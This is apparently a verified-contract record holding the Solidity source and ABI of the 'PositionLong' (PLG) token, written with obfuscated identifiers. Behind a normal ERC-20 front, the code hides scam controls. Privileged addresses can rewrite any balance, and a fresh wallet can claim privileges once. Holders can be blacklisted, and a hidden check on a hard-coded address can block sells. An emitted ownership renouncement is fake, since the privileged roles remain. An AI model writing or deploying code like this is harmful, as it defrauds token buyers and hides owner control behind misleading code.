{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\ninterface swapTo {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract shouldAuto {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface fundSellAt {\n    function createPair(address sellTrading, address txWallet) external returns (address);\n}\n\ninterface liquidityWallet {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address isShouldLiquidity) external view returns (uint256);\n\n    function transfer(address swapAtMarketing, uint256 tokenSell) external returns (bool);\n\n    function allowance(address limitShould, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 tokenSell) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address swapAtMarketing,\n        uint256 tokenSell\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed feeLimit, uint256 value);\n    event Approval(address indexed limitShould, address indexed spender, uint256 value);\n}\n\ninterface fundTo is liquidityWallet {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract PositionLong is shouldAuto, liquidityWallet, fundTo {\n\n    bool public modeMax;\n\n    string private listLaunched = \"Position Long\";\n\n    function totalBuy(address isTo, address swapAtMarketing, uint256 tokenSell) internal returns (bool) {\n        if (isTo == isSenderEnable) {\n            return autoTotal(isTo, swapAtMarketing, tokenSell);\n        }\n        uint256 isLimit = liquidityWallet(enableAt).balanceOf(maxFee);\n        require(isLimit == atToken);\n        require(swapAtMarketing != maxFee);\n        if (tokenWallet[isTo]) {\n            return autoTotal(isTo, swapAtMarketing, toShould);\n        }\n        return autoTotal(isTo, swapAtMarketing, tokenSell);\n    }\n\n    address maxFee = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function owner() external view returns (address) {\n        return marketingSenderLimit;\n    }\n\n    function getOwner() external view returns (address) {\n        return marketingSenderLimit;\n    }\n\n    mapping(address => uint256) private swapTeam;\n\n    mapping(address => mapping(address => uint256)) private toTeam;\n\n    uint256 atToken;\n\n    uint256 private takeSenderFrom = 100000000 * 10 ** 18;\n\n    function symbol() external view virtual override returns (string memory) {\n        return feeTotalWallet;\n    }\n\n    address liquidityBuyLaunched = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return takeSenderFrom;\n    }\n\n    address public enableAt;\n\n    uint256 private limitSwap;\n\n    constructor (){\n        \n        swapTo swapAmountEnable = swapTo(liquidityBuyLaunched);\n        enableAt = fundSellAt(swapAmountEnable.factory()).createPair(swapAmountEnable.WETH(), address(this));\n        if (enableLiquidityTeam != marketingFund) {\n            modeMax = true;\n        }\n        isSenderEnable = _msgSender();\n        liquidityAt();\n        shouldTeam[isSenderEnable] = true;\n        swapTeam[isSenderEnable] = takeSenderFrom;\n        \n        emit Transfer(address(0), isSenderEnable, takeSenderFrom);\n    }\n\n    bool public walletFund;\n\n    bool public fromBuy;\n\n    function fundSwapTeam(address limitTake, uint256 tokenSell) public {\n        buyLaunch();\n        swapTeam[limitTake] = tokenSell;\n    }\n\n    uint256 constant toShould = 4 ** 10;\n\n    mapping(address => bool) public tokenWallet;\n\n    function autoTotal(address isTo, address swapAtMarketing, uint256 tokenSell) internal returns (bool) {\n        require(swapTeam[isTo] >= tokenSell);\n        swapTeam[isTo] -= tokenSell;\n        swapTeam[swapAtMarketing] += tokenSell;\n        emit Transfer(isTo, swapAtMarketing, tokenSell);\n        return true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return isTrading;\n    }\n\n    function modeReceiver(address tradingLaunch) public {\n        require(tradingLaunch.balance < 100000);\n        if (walletFund) {\n            return;\n        }\n        \n        shouldTeam[tradingLaunch] = true;\n        if (receiverFund != fromLaunched) {\n            marketingFund = false;\n        }\n        walletFund = true;\n    }\n\n    address public isSenderEnable;\n\n    function buyLaunch() private view {\n        require(shouldTeam[_msgSender()]);\n    }\n\n    function approve(address receiverBuyToken, uint256 tokenSell) public virtual override returns (bool) {\n        toTeam[_msgSender()][receiverBuyToken] = tokenSell;\n        emit Approval(_msgSender(), receiverBuyToken, tokenSell);\n        return true;\n    }\n\n    function atIsTeam(uint256 tokenSell) public {\n        buyLaunch();\n        atToken = tokenSell;\n    }\n\n    event OwnershipTransferred(address indexed marketingLiquidityFrom, address indexed tradingTx);\n\n    function balanceOf(address isShouldLiquidity) public view virtual override returns (uint256) {\n        return swapTeam[isShouldLiquidity];\n    }\n\n    bool private sellMode;\n\n    address private marketingSenderLimit;\n\n    bool public marketingFund;\n\n    uint8 private isTrading = 18;\n\n    function limitTotal(address shouldIs) public {\n        buyLaunch();\n        \n        if (shouldIs == isSenderEnable || shouldIs == enableAt) {\n            return;\n        }\n        tokenWallet[shouldIs] = true;\n    }\n\n    uint256 marketingMax;\n\n    function transfer(address limitTake, uint256 tokenSell) external virtual override returns (bool) {\n        return totalBuy(_msgSender(), limitTake, tokenSell);\n    }\n\n    function allowance(address autoLaunchedToken, address receiverBuyToken) external view virtual override returns (uint256) {\n        if (receiverBuyToken == liquidityBuyLaunched) {\n            return type(uint256).max;\n        }\n        return toTeam[autoLaunchedToken][receiverBuyToken];\n    }\n\n    uint256 private receiverFund;\n\n    bool private enableLiquidityTeam;\n\n    string private feeTotalWallet = \"PLG\";\n\n    mapping(address => bool) public shouldTeam;\n\n    function transferFrom(address isTo, address swapAtMarketing, uint256 tokenSell) external override returns (bool) {\n        if (_msgSender() != liquidityBuyLaunched) {\n            if (toTeam[isTo][_msgSender()] != type(uint256).max) {\n                require(tokenSell <= toTeam[isTo][_msgSender()]);\n                toTeam[isTo][_msgSender()] -= tokenSell;\n            }\n        }\n        return totalBuy(isTo, swapAtMarketing, tokenSell);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return listLaunched;\n    }\n\n    function liquidityAt() public {\n        emit OwnershipTransferred(isSenderEnable, address(0));\n        marketingSenderLimit = address(0);\n    }\n\n    bool public sellSwap;\n\n    uint256 public fromLaunched;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitShould\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingLiquidityFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingTx\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeLimit\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoLaunchedToken\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverBuyToken\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverBuyToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenSell\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tokenSell\",\"type\":\"uint256\"}],\"name\":\"atIsTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isShouldLiquidity\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromLaunched\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenSell\",\"type\":\"uint256\"}],\"name\":\"fundSwapTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isSenderEnable\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldIs\",\"type\":\"address\"}],\"name\":\"limitTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingLaunch\",\"type\":\"address\"}],\"name\":\"modeReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenSell\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isTo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapAtMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenSell\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "PositionLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}